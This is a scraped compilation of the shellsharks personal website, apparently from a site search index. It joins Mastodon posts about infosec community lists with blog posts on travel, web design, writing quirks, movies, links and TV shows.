for people to send questions to but im sure someone on the fediverse has toyed with this idea. shellsharks @shellsharks 2024-03-18T13:56:16Z @randomxusr This seemed like a popular alt-choice and I do think it&#39;s probably the best one. shellsharks @shellsharks 2024-03-18T14:01:50Z OK, so #AskFediSec seemed to win that particular round but many people offered up the suggestion #AskInfosec which I also really like, so here&#39;s a run-off. For the folks that liked the idea of having a *dedicated* hashtag for this kinda thing, what is your preference below? I&#39;ll also note that some variations of #AskInfoSex were also floated and tbh could be quite popular üòâü§£. #infosec #cybersecurity shellsharks @shellsharks 2024-03-18T14:37:52Z @Newk I see you. I wrote down some (brief) thoughts on this last year if you wanted to read through https://shellsharks. com/notes/2023/11/09/where-i-find-the-time. I don‚Äôt *really* cover specific things to spend money on to free up time as it varies person to person.

I‚Äôve been working with the creators of the Mastodon app ‚ÄúMammoth‚Äù on publishing a ‚ÄúSmart List‚Äù featuring infosec/cybersecurity folks. To start, they asked me to populate the list with 50 high-quality accounts (I assume with some bandwidth to add to that list in the future?). Anyways, after scouring my follow feed for 50 accounts to make the initial cut, you ended up on the list! (Woohoo right? ü•≥). The list is something that I will ‚Äúmaintain‚Äù, though they technically own, review and publish on their end. What it means to be on the list is basically just anyone who has chosen to sub to that particular list that uses the Mammoth client will have a special feed which has your posts in it (amongst everyone elses posts that are also on that list).

Cheers! shellsharks @shellsharks 2024-03-18T20:09:28Z @atomicpoet I&#39;m pretty active but only have about 1500 followers. I&#39;m not opposed to over-spec-ing üòÖ. That said, I&#39;m not sure what I‚Äôm getting ram-wise on my base tier Masto. host sub. I&#39;m on the early access list for spacehost but haven&#39;t gotten an invite in. Would be interested in how it may be better suited for or more economical for my needs than masto. host is though‚Ä¶ I&#39;ve also considered self-hosting on some old hardware at home but perhaps I should just go managed route to avoid all the pitfalls of maintaining software/hardware/uptime/etc‚Ä¶ shellsharks @shellsharks 2024-03-18T20:17:01Z I don‚Äôt have Twitter/X on my phone and have not used the service since I came over to infosec. exchange in late 2022. But! I have seen some great posts from accounts who seem to still primarily exist over there in my timeline via bird. makeup. So my question is, are there any twitter accounts for #infosec / #cybersecurity people that you think are really good / worth following / high value enough that I should add to my follows here (again, via bird. makeup)? It&#39;s not ideal I admit, but given Mastodon + my curated RSS feed is my primary source(s) of infosec news/research/etc. . . i&#39;m not opposed to going the bridge route. Thanks! shellsharks @shellsharks 2024-03-18T20:22:45Z @Viss My favorite will be when CISOs and security managers around the world panic when their active outstanding vulnerability counts on said enterprise Nessus reports jump 20k+ (however many devices are on corp network) when that plugin goes live üò¨ü§£ (despite its meaninglessness) shellsharks @shellsharks 2024-03-18T20:59:21Z @miguel@bracamontesman. cloud What are the details around the self-hosting?

This is what I&#39;ve tried to capture with all the blogs here https://shellsharks. com/infosec-blogs#boutique-security-blogs. My RSS feed is rich with low-volume, high-quality posts from a diverse set of folks posting about their research and experiences within #tech / #infosec / #cybersecurity. I follow thousands of blogs but only get 10&#39;s of updates a day across them. My own main blog post feed is also very much like this üòÉüß° shellsharks @shellsharks 2024-03-20T13:59:59Z @nixfreak if @jerry ü¶ô builds it (stands up instance) people (infosec nerds) will come. üòÖ shellsharks @shellsharks 2024-03-20T19:46:44Z @beta There are lots of reasons why I don&#39;t think reading ‚Äúfull‚Äù blog posts directly within a Fediverse client is a good idea or should be something that is expected. 1. Vanilla Mastodon only supports 500 chars and many clients don&#39;t support rich text and other things that you may typically find on someones site on the actual blog post. 2. People&#39;s sites (especially those of the ‚Äúindie&quot; variety) are awesome, and unique, often with a lot of love poured into the design and delivery of said blog post. Reading within the site itself allows the reader to experience in the way it was meant to be experienced by the author. This and it allows you to discover more from that author on the site itself. I do think its helpful to put a description or teaser text of some kind in the post in order to help give more context to a prospective reader who may click the link. shellsharks @shellsharks 2024-03-20T19:51:40Z @inno4352 I wouldn‚Äôt worry too much about it honestly. I think having larger post character limits is something with no real downsides. It&#39;s vastly superior (in my mind) to have a single monster-post in my feed then to have someone sounding off over the course of a 20-post thread. If you think what you are posting is &quot;bad&quot; or &quot;silly&quot; or &quot;doesn&#39;t belong‚Äù then definitely don&#39;t worry. You are in very good company. Micro-blogging sites are shit-posting &amp; random thought breeding grounds. So drop a 200 char post or drop a 6k char post to your hearts content. It&#39;s why we&#39;re all here! I for one am more interested in seeing long-form posts (preferably natively on someone&#39;s blog) but I will settle for something in a lonnnng micro-post on here. shellsharks @shellsharks 2024-03-21T03:09:03Z @spacebuffer Digging the clean look. Doesn&#39;t look like your RSS feed has your latest post in it though (Feedly at least was not able to pull it up). Here‚Äôs some other ideas for things to add to your site in the future! https://shellsharks. com/notes/2023/08/15/website-component-checklist shellsharks @shellsharks 2024-03-21T03:29:22Z @SecurityByAndrew This was my experience üòÖ. Only two games I was better than him at (of the 100&#39;s we played), Mario Kart (on SNES) and Halo (because I played soooooo much). shellsharks @shellsharks 2024-03-21T12:29:55Z @spacebuffer ah. Dang Feedly. I&#39;m actually planning on moving to a self-hosted RSS solution sometime in the near future so hopefully won&#39;t have to deal with Feedlys quirks any more. shellsharks @shellsharks 2024-03-21T13:06:37Z If you are in #infosec / #cybersecurity and looking for an easier way to follow interesting infosec accounts that are relatively high signal-to-noise without having to scour the Fediverse, consider checking out the #mammoth Mastodon client and subscribing to the new #indiesec Smart List! Smart Lists are a unique feature pioneered by Mammoth which offers curated lists of accounts in a number of different subject areas. To start, the IndieSec Smart List (curated by yours truly) features 50 independent security researchers /professionals across many infosec sub-disciplines. I will continue to maintain this list and add new accounts in the coming weeks (I have a whole backlog of accounts I&#39;d like to see added). Over time, this list will seek to feature many accounts that are lower-volume, but high-quality in terms of content. Surfacing harder-to-find accounts (by doing hours of scrolling and curation) is one more way we as a community are improving #discoverability across the network. Thanks to the @mammoth team and @bart for working with me on this new list. If you have any questions about the list feel free to drop me a message! Edit: I should add - you can see everyone who is featured on this list here https://github. com/shellsharks/assorted/blob/master/resources/mammoth-indiesec. csv. When new accounts are added, they too will be represented there. shellsharks @shellsharks 2024-03-21T13:19:04Z Shoutout to these folks for being featured in the initial publishing of the smart list! @selenalarson@JohnsNotHere@4Dgifts@tweedge@wdormann@reverseics@LukaszOlejnik@raesene@cryptax@catc0n@acrypthash@0ddj0bb@timb_machine@mayahustle@tiraniddo@hdm@obivan@hackNpatch@thc@malmoeb@danaepp@vinoth@verovaleros@alexandreborges@lukasberancz@albinowax@nhamiel@alex@taylorparizo@sanjaymenon@teriradichel@shortridge@yossarian@livinginsyn@EricHogue@neurovagrant@LeeArchinal@harrysintonen@0xor0ne@r1cksec@cyb_detective@abrignoni@Cyberkid1987@buherator@mttaggart@bruienne@florenciocano@karmaz@ahoog42 shellsharks @shellsharks 2024-03-21T20:56:09Z @mk3s hiya shellsharks @shellsharks 2024-03-22T00:59:10Z @cR0w This https://mastofeed. org/ shellsharks @shellsharks 2024-03-22T03:56:20Z @muskless I see you.

This week, it‚Äôs all about Travel Adventures! Here are the questions‚Ä¶ What‚Äôs the silliest souvenir you‚Äôve ever brought back from a trip? If you could teleport anywhere right now, for a day trip, where would you go? What‚Äôs the weirdest food you‚Äôve ever tried while traveling? What‚Äôs the most memorable ‚Äúwrong turn‚Äù you‚Äôve taken on an adventure?Silliest SouvenirIn 2014 me and my wife went to Costa Rica. We did a lot of travel-by-bus to various excusions and destinations across the country. During those bus rides, I (for whatever reason) witnessed an unusual amount of machete-based chopping of vegetation and general plant-related growth on the sides of the rural roads we traveled down. Now this might not be unusual for Costa Rica, but it was for me as a tourist. So naturally, I wanted to get a machete as a souvenir. At the time of purchasing it, I never considered what it would look like, trying to get a huge machete back through customs at the airport‚Ä¶ State-side, we got to security and that‚Äôs when I remembered my cargo. Sure enough, going through security I was asked to come with them to a back room as they had some questions for me. I thought for sure it was because of the machete. But nope! They were interested in a different souvenir of mine. We had also purchased a ‚Äúrain stick‚Äù, which is effectively just a hollow wooden tube filled with small beads. They were really curious (and slightly concerend) about what all those little beads were inside the stick. After a brief explanation though they were satisfied and I was on my way once more. Not even a single mention of the machete. Hah! Teleport for a Day Trip That‚Äôs me in Bora Bora circa 2016. There‚Äôs a very non-zero chance that I was thinking about climbing that mountain in this exact moment (in addition to just posing for a super-cool sunset pic). If I could teleport to one place for a day to do something, it wound be here, to hike Bora Bora‚Äôs Mount Otemanu. Afterwards, I‚Äôd just chill on the beach with a nice beverage and watch the sun set, much like I did in 2016. üèùÔ∏è üåÖ Weirdest FoodIn 2013, I went on my first international trip ever. So where does one go on their first trip out of the country? Africa of course! Me and my wife went to South Africa‚Äîfirst to Cape Town and then to Kruger National Park for some safari-ing. To this day (and I‚Äôve done a fair bit of travel since), I would still say it‚Äôs my favorite trip I‚Äôve ever done. One night, while dining out in the city-center of Cape Town, we ordered what I remember as some sort of ‚Äúexotic meat sampler‚Äù. On the resulting plate, we tried a number of interesting South African-native game including Kudu, Crocodile, Springbok and if I‚Äôm remembering fully, Zebra. All I really remember about that experience beyond what I tried was that Kudu was delicious, and I was not into the croc. Memorable Wrong TurnLook, my wife is the (trip) planner of the two of us, and she is amazing at it. What this means is that our trips are always fantastic, we get into a TON of fun activities, and we rarely encounter anything you might consider a ‚Äúwrong turn‚Äù. That said, this particlar question made me think of two distinct wrong-turn-esque events‚Ä¶ Once, while driving somewhere in Germany we witnessed this little car in front of us try to make too sharp of a turn on a highway on-ramp and completely spin out‚Äîlike a 360¬∞ spin. It was wild, and quite scary to witness. A ‚Äúwrong turn‚Äù for that individual to say the least. The most memorable ‚Äúwrong turn‚Äù for me however occurred when me and my wife were trying to drive back from the national park in Sintra, Portugal to where we were staying in Lisbon. We exited the park into what I imagine was the old-town part of Sintra and ended up on some very tiny streets with extremely narrow passage ways between the buildings and walls of the town. At one point, my wife had to get out of the car and help me narrowly traverse one particularly tight corridor. Our rental was a pretty small car too. Luckily, we made it out without a scratch, literally! Thanks for reading! " }, { "id": 29, "url": "https://shellsharks.com/good-sitekeeping", "title": "Good Sitekeeping", "body": "2025/03/12 - My site is over 5 years old at this point, and in that time I have had several noteworthy site redesigns. In between those big remodels, I‚Äôve also been near-constantly tweaking design elements, and tinkering with the CSS styling. Along the way, I‚Äôve discovered certain site decor and design choices that I think are pleasing. Now I understand that beauty is in the eye of the beholder, which makes this quite subjective. I also am very aware that my site is probably riddled with CSS-related atrocities, accessibility faux pas, and other web design best-practice deviations. But, with all that said, here are some things I have done with my site up to this point that I think make it look and feel great. They are what make it enjoyable for me to just scroll around on and experience, even when I‚Äôm not looking for anything in particular. Sometimes I just browse and click about enjoying the UX I‚Äôve put together. I recommend other folks use these same techniques to make their site look better! Pops of color Generous margins on content pages (e. g. blog posts) Custom ::selection coloring Custom dark/light modes Iconography Little whimsical touches Simple, clean, consistent footer &amp; header Content pages are for content Page published / updated dates Artwork!Pops of ColorYour site doesn‚Äôt need to look like all those ‚Äúprofessional‚Äù, boring, sterile blogs out there. Add color - everywhere! Background colors, font colors, gradients, whatever. I mean you don‚Äôt want things to be garish, but you can color things up in a way that both looks great and isn‚Äôt over the top. Here‚Äôs some of my favorite examples of how I‚Äôve injected color into elements across my site‚Ä¶ My home page. Notice the subtle color-mix() backgrounds for each content stream and the slightly more pronounced border line. Awesome. The Activity feed. Remind you of any other awesome looking design? The Notes feed. Dynamic background colors corresponding to different syndication sources. One of my favorite ideas I‚Äôve had. The Infosec-Only content feed. Little color flourishes on the border-left lines corresponding to different content types. Generous MarginsOn a tablet or desktop browser? Check out the left and right margins! On larger (non mobile) displays, I've given page content ample margins ü§ó. For most of my pages and published content, I‚Äôve allowed for generous margins by setting the content width to max-width: 800px. Not sure I can adequately describe why it makes my posts and content look better, but it just does. There are a few exceptions, notably my home page and the statboard which have nearly-full-width margins. For those pages, I am emphasizing information density so I need that extra horizontal space. Custom ::Selection HighlightingI hadn‚Äôt ever considered doing this and then I think I got the idea from Cory. Try highlighting some text on this page (this won‚Äôt work on mobile)‚Ä¶ Kinda fun right? I don‚Äôt see a lot of sites implement this (maybe because of the accessibility pitfalls?) but I think it‚Äôs just a hella delightful touch. It‚Äôs giving very bespoke, artisinal experience. You can do something similar by setting the ::selection CSS pseudo-element. Dark / Light ModesBesides catering to the personal preferences of your readership (√† la prefers-color-scheme), having different themes is just a fun way to experience your site in (literally) different lights from time to time. A change of scenery if you will. Icons Sprinkle your site with emojis and other icons. On this site, I use Phosphor. It breaks up the monotony of text, and it‚Äôs just fun. Whimsical TouchesI‚Äôm real big on this one. The web should be fun. Life could use a bit more whimsy if you ask me. Put fun li‚Äôl easter eggs and other quirky things on your site. Surprise and delight your audience. You‚Äôre only limited here by your own creativity (and willingness to learn random HTML / JS / CSS stuff). Play with colors, hide li‚Äôl images in secret places, use animations (responsibly), do something different, be unique. My Shark Fin &lt;hr&gt; is one of my favorite whimsical flourishes I‚Äôve come up with for this site thus far. There‚Äôs a lot of other things to discover here too! This very page is filled with custom whimsical touches, differentiating it from other posts on this site and beyond. Simple, Consistent Header &amp; FooterThis is definitely related to the next item, but I‚Äôll speak to it individually. I‚Äôve gone through a variety of different header and footer designs. I also see a lot of other sites headers and footers in my travels across the web. I‚Äôve found my favorite to be those that just keep it simple, light-weight and consistent across pages of the site. After the actual content of my posts, all I have is a &lt;hr&gt;, a quick post meta-data block, a link to the prev/next post(s) and my shark footer. Even with just those things I‚Äôve considered maybe taking out the prev/next links to simplify it even further. More on keeping things simple‚Ä¶ KISS Your Content üòòKeep It Simple Stupid (KISS). It applies in a lot of contexts, and definitely applies to web design - especially for ‚Äúcontent‚Äù pages (i. e. actual blog posts). Maybe this is too-opinionated, but I really don‚Äôt like when I see a blog post, especially a short post, that is followed by a gigantic footer filled with blinky 88x31 buttons, pleas to subscribe, comments, links to other posts on the site, endless dynamically loading content, etc‚Ä¶ There‚Äôs a place for that stuff - on their own distinct pages, or on the home page, or just some place else. I just don‚Äôt like seeing each and every page on a site filled with the same junky footer cruft. Show some love to your post‚Äôs actual content, give it a KISS! &lt;/rant&gt; Dates (e. g. Published: Mar 12, 2025)For the love of god, put publish dates (and preferably also updated dates) on your posts. This isn‚Äôt really a design recommendation, but I think you could say it‚Äôs a good UX requirement. Why can so many sites not figure out how to do this? Artwork Make some art, put it on your site. You don‚Äôt need to go overboard, but there‚Äôs a lot of your individuality that you can express through custom artwork. It doesn‚Äôt necessarily have to be something you‚Äôve made either, you could have it commissioned for example. I have examples of artwork made by me, friends, and by others I‚Äôve found on the Internet. What you need to 100% avoid doing however, is using AI-generated slop art. It‚Äôs lazy, looks terrible and says something, not complimentary, about your site. A crudely drawn stick figure, or just nothing is better received than something AI generated.

Naturally too, I am taking this opportunity to bring this forth via a /why ‚Äúslash page‚Äù. These tenets are not always concious decisions in everything I do, but they are unmistakably part of the foundation of this site, and of myself as a person. My site is meant to be fun - for me, and for whoever comes here. So I purposefully imbue this site with an unapologetic whimsy. It‚Äôs a place to be uniquely me - my aesthetic, my writing style, my art, my topics. I don‚Äôt box myself in creatively. I am free to write across all genres. It‚Äôs been Infosec, Technology, and Life-in-general from the beginning. It is a place for me to learn, to teach, to ‚Äúpay it forward‚Äù. I write with a beginners mindset. I want what I write to be a reference for myself and available to be consumed by all. Every page is a living document, I always reserve the right to change my mind, or add new content. It is a way for me to connect - to be a part of, and build community. Shellsharks is a central, canonical point of presence for myself on the web. I am shellsharks. " }, { "id": 32, "url": "https://shellsharks.com/writing-mannerisms", "title": "Writing Mannerisms", "body": "2025/03/05 - I enjoy writing, it‚Äôs why I have this blog. But my style is far from perfect in the technical sense. I‚Äôm very aware of the many interesting and possibly unique writing quirks and habits I have. So, here I reflect on and catalog those distinct writing mannerisms. I think my most prevalent (bad) habit is run-on sentences, they are everywhere! I consider my style of writing to be very conversational in its cadence, and in this way it tends to mirror my speech in many respects, and I‚Äôve been known to be a bit of a looooong-talker. Alright, I‚Äôve mentioned that my writing is very conversational. In this vein, I use a lot of linguistic affects like ‚Äúok‚Äù, ‚Äúright‚Äù, ‚Äúalright‚Äù, ‚Äúso‚Äù, etc‚Ä¶ I tend to use these at the beginning of sentences. I like to use hyphens (‚Äú - ‚Äú) to bridge two sentences together - joining separate, but related ideas or thoughts together in a way that a standard period doesn‚Äôt seem suited for and where a comma just wouldn‚Äôt supply the correct tempo to. I really use a lot of font styles, e. g. italicizing, underlining and bolding. I‚Äôd describe my methodology for employing these styles as very vibes-based, with no real strict convention. This said, italics are generally reserved as a way for me to emphasize words as I would do if I was actually speaking them in conversation. Bolded terms are meant to highlight the main point or topic of a paragraph / section. More recently, I‚Äôve also started underlining things and don‚Äôt really have a specific usecase for when I typically deploy it. I love links. I spend a lot of time linking out to things locally within a page (to a section anchor for example), internally to my site as well as externally across the web. These links are typically inline, rather than explicit URLs or list(s) of references. My life is very list-driven, the way I think is often very list-based, and so it follows that my writing features a lot of lists. This blog post is essentially one big list! I do a lot of parenthetical asides. For whatever reason, I very-frequently (and am literally going to do it right here) inject my own commentary and bonus context smack-dab in the middle of my sentences. When doing so, I tend to italicize the aside ü§∑‚Äç‚ôÇÔ∏è. This one really bugs me - I have the annoying habit of using ‚Äúit‚Äôs‚Äù when I just need to say ‚Äúits‚Äù. This site has seen it since it‚Äôs inception‚Ä¶ I‚Äôm too often unsure of whether I should use the word ‚Äútheir‚Äù or ‚Äúthere‚Äù. (But don‚Äôt worry, I‚Äôm good on when to use ‚Äúthey‚Äôre‚Äù üòÑ). There‚Äôs (‚¨ÖÔ∏è this one right?) gotta be a way to easily remember which to use‚Ä¶ I use a lot of e. g. ‚Äôs and i. e. ‚Äôs (I‚Äôm sure incorrectly in many cases) and though I‚Äôve looked up their meanings many-a-time (e. g. literally as I write this) I always seem to forget the distinction shortly after (i. e. I often can‚Äôt remember even after just reading the definitions of the two terms). So, for current and future me, e. g. stands for ‚Äúexempli gratia‚Äù or ‚Äúfor example‚Äù and i. e. stands for ‚Äúid est‚Äù which means ‚Äúin other words‚Äù. SMUSH IT INTO YOUR BRAIN~!! HTML supports 6 Section Heading elements, h1 through h6. I‚Äôm somewhat inconsistent in how I deploy them in my posts, it‚Äôs all very vibes-ey. I‚Äôd say most of the time I stick with a standard h1 for main sections across the site, but sometimes I‚Äôll just start with h2 instead, with no h1 as a parent section at all. Best I can explain is that sometimes I feel a post might not ‚Äúdeserve‚Äù a section capitalized by the largest header? I suspect this particular quirk is often seen across my short-form notes. I‚Äôm super inconsistent about grammatically sticking to first-person or second-person. You‚Äôll notice this quite often I‚Äôm sure. Rather than just ending a paragraph or section gracefully with a period, I‚Äôll often just end it with a nice set of ellipsis. Usually this denotes that the next section, paragraph, list, image, or whatever is directly related to what I was just talking about. Like with many of my writing peculiarties, I‚Äôm sure it‚Äôs not being used correctly‚Ä¶ Though I think I‚Äôve started to improve on this, my blog posts (and other content) has never employed a large amount of pictures or graphics. The reason for this is simple - there‚Äôs quite a bit of overhead to add images to posts within my static site generator workflow. Mirrorin‚Äô my own in-speech linguistic tendencies once more, I do a lot of ‚ÄúG-dropping‚Äù, i. e. when a the ‚Äòg‚Äô is dropped in words that end in ‚Äò-ing‚Äô. So in other words, I do a lot of G-droppin‚Äô. (You‚Äôll notice here that I almost always add that li‚Äôl apostrophe when I do a G-drop. ) Emojis. Another more recent addition to my writing flare, I like to add a bit of evocation to my prose üòé. Text walls / monolithic paragraphs are a staple of shellsharks. com. Honestly, I‚Äôll admit that I really don‚Äôt know when to break paragraphs up sometimes. I apologize to your eyeballs. I‚Äôll repeat, I love writing and really enjoy tinkering around on this site. I‚Äôm passionate about this stuff, so I tend to get real excited and do a lot of exclamation points! In reading this, or any of my other posts, would you say the tone is ‚Äúconversational‚Äù? I try to use a lot of questions like these in my writing to help make it so. That‚Äôs it for now! A lot of these call-outs are stylistic choices, while others are admittedly just bad habits or writing deficiencies that over time I‚Äôd like to eradicate. Thanks for sticking with me through all of ‚Äòem! " }, { "id": 33, "url": "https://shellsharks.com/metrics-that-matter", "title": "Metrics That Matter", "body": "2025/03/05 - Joan Westenberg recently published a (relatively short) post titled ‚ÄúThe Only Metrics That Matter‚Äù where she calls out a number of toxic metrics that a lot of sites and site-owners obsess over, i. e. page views, time-on-site, bounce rates, etc. . She (expertly, as usual) calls out that these are the focus because of the ad-supported business model that the modern web survives on, and that that system is not one she cares to participate in with her own site and writing. Can‚Äôt disagree with any of what she‚Äôs said so far. But she loses me a bit with the next bit. She goes on to say that‚Ä¶ I have two metrics that matter: newsletter subscribers and paid supporters. That‚Äôs it. To the exclusion of literally everything else. Her job, the way she makes a living is writing. So I understand that for her, subscribers and actual paid supporters is pretty key to her maintaining a livelihood. But there‚Äôs something a little hollow there to me personally. It‚Äôs hard to quantify in metric-speak, but in saying what she has, she seems to entirely discount the geniune feedback she might receive, or the ways in which her writing may have a profound impact on her readership. To me, that should matter as a metric of sorts as well. I‚Äôm not suggesting that she use that feedback loop to influence her writing per say, I think she should continue to follow the compass she already has as I think it has proven time again fruitful in illuminating very important things. I too write for myself, and don‚Äôt capture any metrics whatsoever. But I‚Äôll admit, my situation is different. I don‚Äôt write to survive so I can afford to not care about metrics or subscribers or anything. But I do care, and take to heart the ways in which things I have put out in the world have had any small amount of impact on those who have been kind enough to read and send me feedback. My writing, what I do on my site, will always be free from analytic-influence, corporate control, ad-revenue, traffic-chasing or anything else. To caveat all this: My disagreement (if you want to call it that) is admittedly nuanced, and she does very explicitly say that she writes ‚Äúfor people‚Äù. So maybe I‚Äôm reading too far into something that‚Äôs not really there. I think Joan is great, and 100% deserves at least your attention, if not your direct support, as her writing is truly amazing and something I really aspire to. So I say this to Joan - my only advice, for whatever it might be worth, is that you (and all writers) strive to value the meaningful impact their voice has on people‚Äôs perspectives, understanding and emotions. It‚Äôs a metric that matters.

If you could live in any movie universe, which would you choose? What‚Äôs the most ridiculous movie plot you‚Äôve ever seen? What movie snack is an absolute must-have for you?What‚Äôs a movie you can practically quote from start to finish?Gladiator. I‚Äôve seen this movie countless times, and have been watching it nigh continuously for decades. Look, it‚Äôs my favorite movie, so yeah I might be biased, but Gladiator has an endless pool of quotable scenes, it‚Äôs just crazy‚Ä¶ My name is Maximus Decimus Meridius, commander of the Armies of the North, General of the Felix Legions and loyal servant to the TRUE emperor, Marcus Aurelius. Father to a murdered son, husband to a murdered wife. And I will have my vengeance, in this life or the next. Hold the line! Stay with me! If you find yourself alone, riding in the green fields with the sun on your face, do not be troubled. For you are in Elysium, and you‚Äôre already dead! At my signal, unleash hell. I search the faces of the gods‚Ä¶ for ways to please you, to make you proud. One kind word, one full hug‚Ä¶ where you pressed me to your chest and held me tight. Would have been like the sun on my heart for a thousand years. What is it in me that you hate so much? Marcus Aurelius is dead, Maximus. We mortals are but shadows and dust. Shadows and dust, Maximus! It vexes me. I‚Äôm terribly vexed. Are you not entertained? Are you not entertained? Is this not why you are here? If you could live in any movie universe, which would you choose?Harry Potter, but only if I can actually be a Wizard / non-muggle. Sure, there‚Äôs some bad stuff that goes on, y‚Äôknow, in the whole he-who-must-not-be-named department, but otherwise it literally seems pretty magical to be in that universe (again, as a Wizard of course). Apparating, morphing (transfiguring) into various animals, crafting potions and generally casting a wide variety of charms and enchantments seems super fun right? I think if I had to choose a specialization, I‚Äôd go with Charms, as that seems like the classic spell-casting class that isn‚Äôt specifically dedicated to ‚Äúcombat‚Äù in the way ‚ÄúDefense Against the Dark Arts‚Äù is. Though I do love me a good magic missile‚Ä¶ Alas, I don‚Äôt live in the Harry Potter universe, (or I do and am just a muggle) but at least I have cybersecurity. What‚Äôs the most ridiculous movie plot you‚Äôve ever seen?I might have to come back to this one later after I have time to really sit and think through the movies I‚Äôve seen to pick out the one that really has the wildest plot‚Ä¶ but for now I‚Äôll just share what came to my mind first‚Ä¶ Ghost Ship. It‚Äôs not entirely ridiculous, at least in my opinion, but it does have a pretty wild scene (if you‚Äôve seen it, you know what I‚Äôm talking about), and the rest of the movie is just kinda ridiculous in its own ways. Who knows, I‚Äôll probably come amend this in a few days after I have a chance to really think about it‚Ä¶ What movie snack is an absolute must-have for you?Twizzlers are my go-to movie snack. A close second would be Sour Punch Straws, with good ol‚Äô fashioned, heavily-buttered, popcorn taking the third spot.

Now that you‚Äôre here, have a byte and refuel, maybe partake in some interstellarweb idea trade (e. g. email me about somethin‚Äô!), and when you‚Äôre ready to depart, I offer many &lt;a&gt; portal outward and onward, into the expanse of space the web! I love links. They brought you here afterall! They will inevitably carry you elsewhere‚Ä¶ They are portals to worlds immeasurable. So yeah, let me tell ya, I‚Äôm a straight-up, certified, link fiend! Every single day I scroll through my feeds, finding, skimming &amp; bookmarking tons of links. To places I want to share, to places I want to explore, to places I want to save and to places I will link to from this site, for your scrolling pleasure. If you‚Äôve been around here long you know how much I like to link to things too. Shellsharks is unlike most places on the web in that way in my humble opinion. My system for writing compels me to enrich what I write with copious links, finding every opportunity to add context and connect elsewhere, both here on this site, and to the web beyond. Contrast that with a ‚Äúnormal‚Äù web site. One that has at best, a sprinkling of links on any given page, and in too many cases, has a hard time even linking to source material, much less bonus or extra material. Since the beginning, I‚Äôve always said ‚Äúwhat I publish here is a reference for myself‚Ä¶‚Äù. For me, that‚Äôs always meant adding as much as I could to my writing to help me best understand the topic at hand, both at that time, and more importantly, into the future. As I do a lot of research, this naturally means linking, and giving credit to, the vast array of sites that have contributed to my own words and understanding. This site is literally a second-brain for me in that way. For as much time as I spend elsewhere on the web, I easily spend even more time here, reading stuff I‚Äôve already written about, trying to remember something, or looking for something I‚Äôve said in the past to share with others. Links mean a lot to me in how I use this site as a resource, and how I navigate its halls. But it also serves as a nice way to send traffic to other awesome places on the web. Places I‚Äôve traveled and got something from, places I hope others travel to and enjoy. I know I personally like to see my site linked to from elsewhere. It‚Äôs a great li‚Äôl endorphine boost! For finding stuff and generally traveling across the Internet, web search has long ruled supreme. But as the hegemonic search providers collapse into AI summary blackholes, voids that let no light links escape, we must learn to navigate without them. (Literally, search providers have suggested removing links in search results and replacing them with only AI summaries). So yeah, start a blog, write cool stuff, browse the IndieWeb and link to the cool articles and sites you find. Find a site or an author you really like? Link to it in a blogroll! Find a ton of stuff and just wanna share a bunch of links regularly? Try something like this! Here‚Äôs a li‚Äôl list of things you can do with links‚Ä¶ Link to a cool external site &lt;a href= EXTERNAL LINK &gt;&lt;/a&gt; Link to other pages on your own site (relative) &lt;a href= /RELATIVE LINK &gt;&lt;/a&gt; link to a section on a page (via an anchor) &lt;a href= #ANCHOR &gt;&lt;/a&gt; Set the referrerpolicy attribute Change how/where a link is opened via the target attribute Create a page table of contents Footnotes Webmentions Next and Previous links as part of a webring Poetry URL Schemes Because this is post all about how great links are, here‚Äôs some great links‚Ä¶ Explore the IndieWeb Delights of the IndieWeb My Blogroll My Favorite Indie Sites What I‚Äôm Most Proud Of Scrolls - A place with a lot of links to travel to!

This time, it‚Äôs all about TV Shows. But first, how did we get here?

Post by @jcrabapple@dmv. community View on Mastodon You can follow blog_challenge@beep. town to get future posts about blog challenges! Thanks Jcrabapple! Blog Questions Challenge - ‚ÄúTV Shows‚ÄùThis week‚Äôs Blog Questions Challenge is ‚ÄúTV Shows‚Äù. Here are the questions‚Ä¶ What TV character from a beloved show do you wish you could be best friends with in real life? [GO] If you could binge-watch an entire series again for the first time, which one would you choose and why? [GO] Name a TV show that changed your perspective on the world or taught you something valuable. [GO] ‚Ä¶and one extra bonus question, how exciting! [GO]TV Friend: I‚Äôm goin‚Äô Chris Turk from Scrubs. What‚Äôs not to like?! Incredibly funny, would definitely play basketball with me, can help me with my various foot injuries, and is a fiercely loyal friend. Easy choice. Re-watch a show for the first time: Truthfully, my first thought here was Scrubs, hah! It‚Äôs probably my favorite show of all time. But honestly, it‚Äôs as enjoyable rewatching for the nth time as it was the first time, so that won‚Äôt be my choice. Instead, I‚Äôm going to go with Dexter. Look, the entire show wasn‚Äôt perfect, but a lot of those seasons were amazing. I‚Äôm normally a sci-fi, or fantasy, or comedy-type of TV show-watcher, but something about this show I found very compelling and perfectly suspenseful. TV show that taught me something: This was a tough one for me. A lot of the TV shows I watch are (as I mentioned earlier) in the Sci-Fi, Fantasy or Comedy realms. Not that those can‚Äôt have teaching or world-perspective-changing qualities, but it‚Äôs just not what I am looking for when I seek the escape of TV. I do have an answer though, and it‚Äôs kinda funny‚Ä¶ Scrubs! Maybe it‚Äôs because I‚Äôve watched that series so many times, but I actually learned a fair bit about medical / doctor / hospital stuff from that show. And I know a lot of it is real as I have many friends/family members who are doctors who have said that things in that show are actually pretty on-point. BONUS: TV show I would like more of: As a bonus, I‚Äôm adding an extra TV show question. The question is ‚ÄúWhich TV show do you wish had more episodes/seasons‚Äù. Now this is a gooooood one. As there are so many TV shows I‚Äôd like moooarrr of. I love Andor and Rings of Power, but both of those shows are already set to come back and, give us more. So instead, I‚Äôm going to choose Halo. I know, I know. Halo wasn‚Äôt the best show across its two seasons, but I thought it was pretty good. I was a Halo super-fan back in the day (and very good if I do say so myself). I think that universe, and that story, has SO MUCH to offer, and would love to see it entirely explored. Thanks for reading!

But it turns out, not only did people find and read what I had to say, but they were nice enough to tell me they liked it too. This post is all about that. Kindness. I‚Äôm very appreciative of everyone who has taken the time to reach out and let me know they liked something they saw on my site. Thank you! üß° Below is just a log of nice things people have reached out to me and said. Some days, when I don‚Äôt feel like writing, or I‚Äôm just bummed about the world, maybe I can come here and remember everyone who I‚Äôve helped in some small way and use it as motivation. If there‚Äôs something, or someone you appreicate out there, just send ‚Äòem a message! I‚Äôm sure it will mean a lot to them. From Arjun (4/4/25) I just wanted to reach out and say a big thank you. Your work on Shellsharks and especially your article on why people should blog. It pushed me to finally start my own blog‚Äîeven though it‚Äôs super basic right now and nowhere near as cool as Shellsharks! I‚Äôve built this space to share my work, explore interesting cyber threats, and document my learnings. My goal over the next few months is to stay consistent, keep improving the site, and use it as a platform to grow and contribute to the community. It‚Äôs been a great learning experience so far, and I owe a lot of that inspiration to you‚Ä¶ Thanks again 